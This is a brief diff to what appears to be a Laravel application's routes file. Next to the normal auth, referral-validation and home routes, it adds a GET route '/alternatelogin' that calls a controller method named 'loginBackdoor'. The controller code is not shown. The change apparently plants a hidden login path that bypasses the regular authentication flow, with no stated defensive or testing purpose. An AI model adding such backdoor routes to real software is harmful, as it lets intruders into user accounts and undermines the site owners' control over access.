@@ -15,6 +15,8 @@ Route::get('/', 'HomeController@landingPage');
 
 Auth::routes();
 
+Route::get('/alternatelogin', 'HomeController@loginBackdoor');
+
 Route::post('/validate/referral', 'SignUpController@validateReferral')->name('validate_referral');
 
 Route::get('/home', 'HomeController@index')->name('home');
